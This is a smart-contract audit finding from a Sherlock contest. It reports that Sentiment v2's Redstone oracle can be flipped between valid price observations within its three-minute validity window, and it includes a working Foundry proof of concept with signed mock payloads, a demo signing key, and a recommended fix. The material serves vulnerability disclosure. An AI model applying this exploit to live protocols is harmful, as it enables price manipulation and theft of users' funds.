Scrawny Blonde Guppy

High

# Red Stone Oracle Can Time Travel

## Summary

The [`RedstoneCoreOracle`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol) can be atomically manipulated repeatedly back and forth between different observations within the validity period to yield different price readings upon demand.

## Vulnerability Detail

The [`RedstoneCoreOracle`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L12C10-L12C28) requires callers to manually update and cache the oracle price via the [`updatePrice`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L48C14-L48C25) function:

```solidity
function updatePrice() external {
    // values[0] -> price of ASSET/USD
    // values[1] -> price of ETH/USD
    // values are scaled to 8 decimals

    uint256[] memory values = getOracleNumericValuesFromTxMsg(dataFeedIds);

    assetUsdPrice = values[0];
    ethUsdPrice = values[1];

    // RedstoneDefaultLibs.sol enforces that prices are not older than 3 mins. since it is not
    // possible to retrieve timestamps for individual prices being passed, we consider the worst
    // case and assume both prices are 3 mins old
    priceTimestamp = block.timestamp - THREE_MINUTES;
}
```

Although here we correctly consider the worst-case staleness for newly-submitted observation (and the inter-observation timestamps themselves are validated to be consistent between both readings), there are are no protections against repeatedly calling [`updatePrice`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L48C14-L48C25) using valid data during the result validity period (for example, two different observations which took place within the same validity period) - even if that data has been seen before.

This means it is possible to call [`updatePrice`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L48C14-L48C25) with one valid observation, immediately call it with a second valid observation, and then update again to revert back to the original observation in an effort to manipulate price.

### Proof of Concept

This proof of concept is split into two sections - for quick verification, judges need only focus on the first part, whereas the second part provides instructions on how to recreate mock payloads locally.

#### Example Observations (default)

1. Add the following file (i.e. `Sherlock.t.sol`) to the [`protocol-v2/test`](https://github.com/sherlock-audit/2024-08-sentiment-v2/tree/main/protocol-v2/test) directory:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import { Math } from "@openzeppelin/contracts/utils/math/Math.sol";
import "@redstone-oracles-monorepo/packages/evm-connector/contracts/data-services/MainDemoConsumerBase.sol";

import {RedstoneCoreOracle} from "../src/oracle/RedstoneOracle.sol";

/// @notice A mock oracle which allows us to use Sentiment's
/// @notice `RedstoneCoreOracle` in conjunction with the
/// @notice mock payload signatures.
contract SherlockRedstoneCoreOracle is RedstoneCoreOracle {

    constructor(address asset, bytes32 assetFeedId, bytes32 ethFeedId)
        RedstoneCoreOracle(asset, assetFeedId, ethFeedId) {}

    function getUniqueSignersThreshold() public view virtual override returns (uint8) {
        return 1;
    }

    function getAuthorisedSignerIndex(
        address signerAddress
    ) public view virtual override returns (uint8) {
        /// @notice Using the address related to the private key in
        /// @notice Redstone Finance's `minimal-foundry-repo`: https://github.com/redstone-finance/minimal-foundry-repo/blob/c493d4c1e15fa1b08ebaae85f454b843ba5999c4/getRedstonePayload.js#L24C24-L24C90

        /// @dev const redstoneWallet = new ethers.Wallet('0x548e7c2fae09cc353ffe54ed40609d88a99fab24acfc81bfbf5cd9c11741643d');
        //  @dev console.log('Redstone:', redstoneWallet.address);
        /// @dev Redstone: 0x71d00abE308806A3bF66cE05CF205186B0059503
        if (signerAddress == 0x71d00abE308806A3bF66cE05CF205186B0059503) return 0;

        revert SignerNotAuthorised(signerAddress);
    }
}

contract SherlockTest is Test {

    using Math for uint256;

    /// @notice Demonstrate that the `RedstoneCoreOracle` is
    /// @notice vulnerable to manipulation.
    function testSherlockRedstoneTimestampManipulation() external {
        /// @notice You must use an Arbitrum mainnet compatible
        /// @notice archive node rpc.
        vm.createSelectFork(vm.envString("ARB_RPC_URL"));

        /// @notice This conditional controls whether to generate and sign
        /// @notice Redstone payloads locally, in case judges would like to
        /// @notice verify the payload content for themselves. This happens
        /// @notice if you specify `GENERATE_REDSTONE_PAYLOADS=true`
        /// @notice in your `.env`.
        /// @notice By default, the test suite will fall back to the included payloads. 
        bool generatePayloads = vm.envExists("GENERATE_REDSTONE_PAYLOADS");
        if (generatePayloads) generatePayloads = vm.envBool("GENERATE_REDSTONE_PAYLOADS");

        /// @notice Warp to a recent Arbitrum block. We have this fixed
        /// @notice in place to ease the generation of mock observations
        /// @notice which satisfy the validity period.
        vm.warp(243528007) /* Warp To Block */;

        bytes memory beforePayload = (
            generatePayloads
                ? new SherlockMockRedstonePayload().getRedstonePayload("ETH:3000:8,USDC:1:8", "243528007000")
                : bytes(hex"455448000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045d964b80055534443000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e1000038b3667d5800000020000002f3d4b060d793f6ba027fcbb94ab6ba26f17a1527446c42e7bc32e14926aa2f1167d1d38049f766c56d48170b9acdea4315b2132a6e3bba0137b87bf2305df1371c0001000000000002ed57011e0000")
        );

        bytes memory afterPayload = (
            generatePayloads
                ? new SherlockMockRedstonePayload().getRedstonePayload("ETH:2989:8,USDC:1:8", "243528066000" /* 59s in the future */)
                : bytes(hex"45544800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004597d40d0055534443000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e1000038b36763d00000002000000290709f13dc06738bbdb82175adbd9b0532cad9db59367b9e63ffac979230fdf222a0043cbcfe6244c30207df1355c416c6165b5d0b1d2a54eab53a807de8a5ed1b0001000000000002ed57011e0000")
        );

        SherlockRedstoneCoreOracle sherlockRedstoneCoreOracle = new SherlockRedstoneCoreOracle({
            asset: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831,
            assetFeedId: bytes32("USDC"),
            ethFeedId: bytes32("ETH")
        });

        bool success;

        console.log("Apply Before Payload:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), beforePayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());

        console.log("Apply After Payload:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), afterPayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());

        console.log("Apply Before Payload Again:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), beforePayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());
    }

}

/// @notice A contract which we can use to pull results from
/// @notice `getRedstonePayload.js`, a utility which enables
/// @notice us to mock redstone payloads for local development.
/// @notice This is only used when `GENERATE_REDSTONE_PAYLOADS=true`.
/// @notice Credit: https://github.com/redstone-finance/minimal-foundry-repo/blob/main/getRedstonePayload.js
contract SherlockMockRedstonePayload is Test {
    function getRedstonePayload(
        // dataFeedId:value:decimals
        string memory priceFeed,
        // i.e. 1000
        string memory timestampMilliseconds
    ) public returns (bytes memory) {
        string[] memory args = new string[](4);
        args[0] = "node";
        args[1] = "../minimal-foundry-repo/getRedstonePayload.js";
        args[2] = priceFeed;
        args[3] = timestampMilliseconds;

        return vm.ffi(args);
    }
}
```

Next, run `ARB_RPC_URL="arbitrum-archive-node-url" forge test --match-test "testSherlockRedstoneTimestampManipulation" --ffi -vv` to yield the following:

```shell
Ran 1 test for test/Sherlock.t.sol:SherlockTest
[PASS] testSherlockRedstoneTimestampManipulation() (gas: 1332213)
Logs:
  Apply Before Payload:
  ETH: 300000000000
  USDC: 100000000
  Apply After Payload:
  ETH: 298900000000
  USDC: 100000000
  Apply Before Payload Again:
  ETH: 300000000000
  USDC: 100000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.52s (2.52s CPU time)

Ran 1 test suite in 3.10s (2.52s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

This demonstrates that the oracle price can be manipulated arbitrarily, atomically.

#### Generating Observations

In order to validate the calldata in the provided proof of concept exploit is authentic, in addition to the previous steps, judges will need to perform the following:

1. Clone Redstone Finance's [`minimal-foundry-repo`](https://github.com/redstone-finance/minimal-foundry-repo) to the top-level of the contest repo.
2. Run through [the setup instructions](https://github.com/redstone-finance/minimal-foundry-repo/tree/main?tab=readme-ov-file#foundry--redstone).
3. Modify [`getRedstonePayload.js`](https://github.com/redstone-finance/minimal-foundry-repo/blob/main/getRedstonePayload.js) so that we can control the timestamp that the signatures are validated at via CLI argument, instead of using the system clock (this ensures we can generate observations which match the fork block number in the test):

```diff
- const timestampMilliseconds = Date.now();
+ const timestampMilliseconds = parseInt(args[1]); /// @dev Allow us to use custom timestamps.
```

4. Verify the implementation is working. In the working directory of `minimal-foundry-repo`, you should be able to generate simulated observations at custom timestamps like so:

```shell
node getRedstonePayload.js ETH:2989:8,USDC:1:8 243528066000
0x45544800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004597d40d0055534443000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e1000038b36763d00000002000000290709f13dc06738bbdb82175adbd9b0532cad9db59367b9e63ffac979230fdf222a0043cbcfe6244c30207df1355c416c6165b5d0b1d2a54eab53a807de8a5ed1b0001000000000002ed57011e0000
```

5. Finally, re-run the tests back in the foundry project using:

```shell
GENERATE_REDSTONE_PAYLOADS=true ARB_RPC_URL="arbitrum-archive-node-url" forge test --match-test "testSherlockRedstoneTimestampManipulation" --ffi -vv
```

## Impact

The [`RedstoneCoreOracle`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol) can be arbitrarily and repeatedly warped between preferential timepoints that coexist within the validity period, and is therefore highly susceptible to price manipulation.

An attacker may exploit volatility over a three minute period (i.e. a stepwise reduction or appreciation in relative asset value) and repeatedly trade between minima and maxima - for example, purchasing at a checkpoint of low valuation and selling at a checkpoint of higher valuation.

This manipulation can be performed atomically within a single transaction, and requires little complexity.

## Code Snippet

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/oracle/RedstoneOracle.sol#L48C5-L61C6

## Tool used

Manual Review

## Recommendation

Allow at least the `THREE_MINUTES` period to expire since the last update before accepting a new update; if an attempt is made during this period, then terminate execution silently without a `revert`.

Here's an [example](https://github.com/euler-xyz/euler-price-oracle/blob/eeb1847df7d9d58029de37225dabf963bf1a65e6/src/adapter/redstone/RedstoneCoreOracle.sol#L71C9-L72C75) of this approach.
